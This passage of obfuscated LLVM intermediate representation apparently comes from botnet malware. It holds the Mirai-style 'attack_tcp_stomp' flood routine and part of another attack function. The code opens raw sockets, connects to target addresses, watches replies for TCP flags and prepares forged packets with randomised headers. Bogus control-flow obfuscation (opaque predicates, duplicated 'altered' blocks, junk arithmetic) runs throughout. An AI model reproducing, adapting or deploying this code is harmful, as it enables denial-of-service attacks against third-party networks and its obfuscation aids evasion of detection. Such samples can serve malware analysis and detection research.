  %_2 = sub i16 0, %630
  %gen3 = add i16 %_2, 2048
  %_4 = shl i16 %630, 2048
  %_5 = sub i16 0, %630
  %gen6 = add i16 %_5, 2048
  %_7 = sub i16 %630, 2048
  %gen8 = mul i16 %_7, 2048
  %_9 = sub i16 %630, 2048
  %gen10 = mul i16 %_9, 2048
  %631 = or i16 %630, 2048
  store i16 %631, i16* %628, align 4
  br label %originalBB1

originalBB14alteredBB:                            ; preds = %originalBB14, %324
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %341
  store i32 0, i32* %11, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %363
  %632 = load i8**, i8*** %13, align 8
  %633 = load i32, i32* %11, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds i8*, i8** %632, i64 %634
  %636 = load i8*, i8** %635, align 8
  store i8* %636, i8** %35, align 8
  %637 = load i8*, i8** %35, align 8
  %638 = bitcast i8* %637 to %struct.iphdr*
  store %struct.iphdr* %638, %struct.iphdr** %36, align 8
  %639 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %640 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %639, i64 1
  %641 = bitcast %struct.iphdr* %640 to %struct.tcphdr*
  store %struct.tcphdr* %641, %struct.tcphdr** %37, align 8
  %642 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %643 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %642, i64 1
  %644 = bitcast %struct.tcphdr* %643 to i8*
  store i8* %644, i8** %38, align 8
  %645 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %646 = load i32, i32* %11, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %645, i64 %647
  %649 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %648, i32 0, i32 2
  %650 = load i8, i8* %649, align 4
  %651 = zext i8 %650 to i32
  %652 = icmp slt i32 %651, 32
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %425
  %653 = call i32 @rand_next()
  %654 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %655 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %654, i32 0, i32 8
  store i32 %653, i32* %655, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %449
  %656 = call i32 @rand_next()
  %_31 = sub i32 %656, 65535
  %gen32 = mul i32 %_31, 65535
  %_33 = sub i32 %656, 65535
  %gen34 = mul i32 %_33, 65535
  %_35 = sub i32 0, %656
  %gen36 = add i32 %_35, 65535
  %_37 = sub i32 0, %656
  %gen38 = add i32 %_37, 65535
  %_39 = sub i32 0, %656
  %gen40 = add i32 %_39, 65535
  %657 = and i32 %656, 65535
  %658 = trunc i32 %657 to i16
  %659 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %660 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %659, i32 0, i32 3
  store i16 %658, i16* %660, align 4
  br label %originalBB30

originalBB44alteredBB:                            ; preds = %originalBB44, %564
  %661 = load i32, i32* %11, align 4
  %_45 = sub i32 0, %661
  %gen46 = add i32 %_45, 1
  %_47 = sub i32 %661, 1
  %gen48 = mul i32 %_47, 1
  %_49 = sub i32 0, %661
  %gen50 = add i32 %_49, 1
  %_51 = sub i32 0, %661
  %gen52 = add i32 %_51, 1
  %_53 = sub i32 0, %661
  %gen54 = add i32 %_53, 1
  %_55 = shl i32 %661, 1
  %_56 = sub i32 0, %661
  %gen57 = add i32 %_56, 1
  %_58 = sub i32 0, %661
  %gen59 = add i32 %_58, 1
  %662 = add nsw i32 %661, 1
  store i32 %662, i32* %11, align 4
  br label %originalBB44

originalBB63alteredBB:                            ; preds = %originalBB63, %589
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %606
  br label %originalBB67
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.27
  %7 = load i32, i32* @y.28
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.attack_stomp_data*, align 8
  %22 = alloca i8**, align 8
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i16, align 2
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca %struct.sockaddr_in, align 4
  %39 = alloca %struct.sockaddr_in, align 4
  %40 = alloca i32, align 4
  %41 = alloca [256 x i8], align 16
  %42 = alloca i64, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %44 = alloca i32, align 4
  %45 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %46 = alloca %struct.tcphdr*, align 8
  %47 = alloca %struct.iphdr*, align 8
  %48 = alloca %struct.tcphdr*, align 8
  %49 = alloca i8*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca %struct.iphdr*, align 8
  %52 = alloca %struct.tcphdr*, align 8
  %53 = alloca i8*, align 8
  %54 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %55 = load i8, i8* %15, align 1
  %56 = zext i8 %55 to i64
  %57 = call noalias i8* @calloc(i64 %56, i64 16) #6
  %58 = bitcast i8* %57 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %58, %struct.attack_stomp_data** %21, align 8
  %59 = load i8, i8* %15, align 1
  %60 = zext i8 %59 to i64
  %61 = call noalias i8* @calloc(i64 %60, i64 8) #6
  %62 = bitcast i8* %61 to i8**
  store i8** %62, i8*** %22, align 8
  %63 = load i8, i8* %17, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 2, i32 0)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %23, align 1
  %67 = load i8, i8* %17, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 3, i32 65535)
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %24, align 2
  %71 = load i8, i8* %17, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 4, i32 64)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %25, align 1
  %75 = load i8, i8* %17, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 5, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %26, align 1
  %79 = load i8, i8* %17, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 65535)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %27, align 2
  %83 = load i8, i8* %17, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 10, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %28, align 1
  %87 = load i8, i8* %17, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 11, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %29, align 1
  %91 = load i8, i8* %17, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 12, i32 1)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %30, align 1
  %95 = load i8, i8* %17, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 13, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %31, align 1
  %99 = load i8, i8* %17, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 14, i32 0)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %32, align 1
  %103 = load i8, i8* %17, align 1
  %104 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %105 = call i32 @attack_get_opt_int(i8 zeroext %103, %struct.attack_option* %104, i8 zeroext 15, i32 0)
  %106 = trunc i32 %105 to i8
  store i8 %106, i8* %33, align 1
  %107 = load i8, i8* %17, align 1
  %108 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %109 = call i32 @attack_get_opt_int(i8 zeroext %107, %struct.attack_option* %108, i8 zeroext 0, i32 768)
  store i32 %109, i32* %34, align 4
  %110 = load i8, i8* %17, align 1
  %111 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %112 = call i32 @attack_get_opt_int(i8 zeroext %110, %struct.attack_option* %111, i8 zeroext 1, i32 1)
  %113 = trunc i32 %112 to i8
  store i8 %113, i8* %35, align 1
  %114 = call i64 @time(i64* null) #6
  %115 = load i32, i32* %14, align 4
  %116 = sext i32 %115 to i64
  %117 = add nsw i64 %114, %116
  %118 = trunc i64 %117 to i32
  store i32 %118, i32* %36, align 4
  %119 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %119, i32* %20, align 4
  %120 = icmp eq i32 %119, -1
  %121 = load i32, i32* @x.27
  %122 = load i32, i32* @y.28
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %120, label %129, label %130

; <label>:129:                                    ; preds = %originalBBpart2
  br label %965

; <label>:130:                                    ; preds = %originalBBpart2
  %131 = load i32, i32* @x.27
  %132 = load i32, i32* @y.28
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %130
  store i32 1, i32* %19, align 4
  %139 = load i32, i32* %20, align 4
  %140 = bitcast i32* %19 to i8*
  %141 = call i32 @setsockopt(i32 %139, i32 0, i32 3, i8* %140, i32 4) #6
  %142 = icmp eq i32 %141, -1
  %143 = load i32, i32* @x.27
  %144 = load i32, i32* @y.28
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %142, label %151, label %154

; <label>:151:                                    ; preds = %originalBBpart214
  %152 = load i32, i32* %20, align 4
  %153 = call i32 @close(i32 %152)
  br label %965

; <label>:154:                                    ; preds = %originalBBpart214
  store i32 0, i32* %19, align 4
  br label %155

; <label>:155:                                    ; preds = %originalBBpart2119, %154
  %156 = load i32, i32* @x.27
  %157 = load i32, i32* @y.28
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %155
  %164 = load i32, i32* %19, align 4
  %165 = load i8, i8* %15, align 1
  %166 = zext i8 %165 to i32
  %167 = icmp slt i32 %164, %166
  %168 = load i32, i32* @x.27
  %169 = load i32, i32* @y.28
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %167, label %176, label %779

; <label>:176:                                    ; preds = %originalBBpart218
  %177 = load i32, i32* @x.27
  %178 = load i32, i32* @y.28
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %176
  store i32 0, i32* %37, align 4
  %185 = load i32, i32* @x.27
  %186 = load i32, i32* @y.28
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %193

; <label>:193:                                    ; preds = %755, %originalBBpart295, %originalBBpart222
  %194 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %194, i32* %37, align 4
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %196, label %197

; <label>:196:                                    ; preds = %193
  br label %760

; <label>:197:                                    ; preds = %193
  %198 = load i32, i32* %37, align 4
  %199 = load i32, i32* %37, align 4
  %200 = call i32 (i32, i32, ...) @fcntl(i32 %199, i32 3, i32 0)
  %201 = or i32 %200, 2048
  %202 = call i32 (i32, i32, ...) @fcntl(i32 %198, i32 4, i32 %201)
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 0
  store i16 2, i16* %203, align 4
  %204 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %205 = load i32, i32* %19, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = icmp slt i32 %210, 32
  br i1 %211, label %212, label %249

; <label>:212:                                    ; preds = %197
  %213 = load i32, i32* @x.27
  %214 = load i32, i32* @y.28
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %212
  %221 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %222 = load i32, i32* %19, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i64 %223
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i32 0, i32 1
  %226 = load i32, i32* %225, align 4
  %227 = call i32 @ntohl(i32 %226) #7
  %228 = call i32 @rand_next()
  %229 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %230 = load i32, i32* %19, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i32 0, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = zext i8 %234 to i32
  %236 = lshr i32 %228, %235
  %237 = add i32 %227, %236
  %238 = call i32 @htonl(i32 %237) #7
  %239 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %240 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %239, i32 0, i32 0
  store i32 %238, i32* %240, align 4
  %241 = load i32, i32* @x.27
  %242 = load i32, i32* @y.28
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart243, label %originalBB24alteredBB

originalBBpart243:                                ; preds = %originalBB24
  br label %274

; <label>:249:                                    ; preds = %197
  %250 = load i32, i32* @x.27
  %251 = load i32, i32* @y.28
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %249
  %258 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %259 = load i32, i32* %19, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %258, i64 %260
  %262 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %261, i32 0, i32 1
  %263 = load i32, i32* %262, align 4
  %264 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %265 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %264, i32 0, i32 0
  store i32 %263, i32* %265, align 4
  %266 = load i32, i32* @x.27
  %267 = load i32, i32* @y.28
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %274

; <label>:274:                                    ; preds = %originalBBpart247, %originalBBpart243
  %275 = load i16, i16* %27, align 2
  %276 = zext i16 %275 to i32
  %277 = icmp eq i32 %276, 65535
  br i1 %277, label %278, label %283

; <label>:278:                                    ; preds = %274
  %279 = call i32 @rand_next()
  %280 = and i32 %279, 65535
  %281 = trunc i32 %280 to i16
  %282 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  store i16 %281, i16* %282, align 2
  br label %287

; <label>:283:                                    ; preds = %274
  %284 = load i16, i16* %27, align 2
  %285 = call zeroext i16 @htons(i16 zeroext %284) #7
  %286 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  store i16 %285, i16* %286, align 2
  br label %287

; <label>:287:                                    ; preds = %283, %278
  %288 = load i32, i32* @x.27
  %289 = load i32, i32* @y.28
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %287
  %296 = load i32, i32* %37, align 4
  %297 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %298 = bitcast %struct.sockaddr_in* %38 to %struct.sockaddr*
  store %struct.sockaddr* %298, %struct.sockaddr** %297, align 8
  %299 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %300 = load %struct.sockaddr*, %struct.sockaddr** %299, align 8
  %301 = call i32 @connect(i32 %296, %struct.sockaddr* %300, i32 16)
  %302 = call i64 @time(i64* null) #6
  store i64 %302, i64* %42, align 8
  %303 = load i32, i32* @x.27
  %304 = load i32, i32* @y.28
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %311

; <label>:311:                                    ; preds = %758, %originalBBpart251
  %312 = load i32, i32* @x.27
  %313 = load i32, i32* @y.28
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %311
  store i32 0, i32* %44, align 4
  store i32 16, i32* %40, align 4
  %320 = load i32, i32* %20, align 4
  %321 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i32 0, i32 0
  %322 = bitcast %union.__CONST_SOCKADDR_ARG* %45 to %struct.sockaddr**
  %323 = bitcast %struct.sockaddr_in* %39 to %struct.sockaddr*
  store %struct.sockaddr* %323, %struct.sockaddr** %322, align 8
  %324 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %45, i32 0, i32 0
  %325 = load %struct.sockaddr*, %struct.sockaddr** %324, align 8
  %326 = call i64 @recvfrom(i32 %320, i8* %321, i64 256, i32 16384, %struct.sockaddr* %325, i32* %40)
  %327 = trunc i64 %326 to i32
  store i32 %327, i32* %44, align 4
  %328 = load i32, i32* %44, align 4
  %329 = icmp eq i32 %328, -1
  %330 = load i32, i32* @x.27
  %331 = load i32, i32* @y.28
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %329, label %338, label %355

; <label>:338:                                    ; preds = %originalBBpart255
  %339 = load i32, i32* @x.27
  %340 = load i32, i32* @y.28
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %338
  %347 = load i32, i32* @x.27
  %348 = load i32, i32* @y.28
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %965

; <label>:355:                                    ; preds = %originalBBpart255
  %356 = load i32, i32* @x.27
  %357 = load i32, i32* @y.28
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %355
  %364 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %39, i32 0, i32 2
  %365 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %364, i32 0, i32 0
  %366 = load i32, i32* %365, align 4
  %367 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %368 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %367, i32 0, i32 0
  %369 = load i32, i32* %368, align 4
  %370 = icmp eq i32 %366, %369
  %371 = load i32, i32* @x.27
  %372 = load i32, i32* @y.28
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %370, label %379, label %734

; <label>:379:                                    ; preds = %originalBBpart263
  %380 = load i32, i32* @x.27
  %381 = load i32, i32* @y.28
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %379
  %388 = load i32, i32* %44, align 4
  %389 = sext i32 %388 to i64
  %390 = icmp ugt i64 %389, 40
  %391 = load i32, i32* @x.27
  %392 = load i32, i32* @y.28
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %390, label %399, label %734

; <label>:399:                                    ; preds = %originalBBpart267
  %400 = load i32, i32* @x.27
  %401 = load i32, i32* @y.28
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %399
  %408 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i32 0, i32 0
  %409 = getelementptr inbounds i8, i8* %408, i64 20
  %410 = bitcast i8* %409 to %struct.tcphdr*
  store %struct.tcphdr* %410, %struct.tcphdr** %46, align 8
  %411 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 0
  %413 = load i16, i16* %412, align 4
  %414 = zext i16 %413 to i32
  %415 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  %416 = load i16, i16* %415, align 2
  %417 = zext i16 %416 to i32
  %418 = icmp eq i32 %414, %417
  %419 = load i32, i32* @x.27
  %420 = load i32, i32* @y.28
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %418, label %427, label %733

; <label>:427:                                    ; preds = %originalBBpart271
  %428 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 4
  %430 = load i16, i16* %429, align 4
  %431 = lshr i16 %430, 9
  %432 = and i16 %431, 1
  %433 = zext i16 %432 to i32
  %434 = icmp ne i32 %433, 0
  br i1 %434, label %435, label %696

; <label>:435:                                    ; preds = %427
  %436 = load i32, i32* @x.27
  %437 = load i32, i32* @y.28
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %435
  %444 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %445 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %444, i32 0, i32 4
  %446 = load i16, i16* %445, align 4
  %447 = lshr i16 %446, 12
  %448 = and i16 %447, 1
  %449 = zext i16 %448 to i32
  %450 = icmp ne i32 %449, 0
  %451 = load i32, i32* @x.27
  %452 = load i32, i32* @y.28
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBBpart287, label %originalBB73alteredBB

originalBBpart287:                                ; preds = %originalBB73
  br i1 %450, label %459, label %696

; <label>:459:                                    ; preds = %originalBBpart287
  %460 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %461 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %460, i32 0, i32 0
  %462 = load i32, i32* %461, align 4
  %463 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %464 = load i32, i32* %19, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %463, i64 %465
  %467 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %466, i32 0, i32 0
  store i32 %462, i32* %467, align 4
  %468 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 2
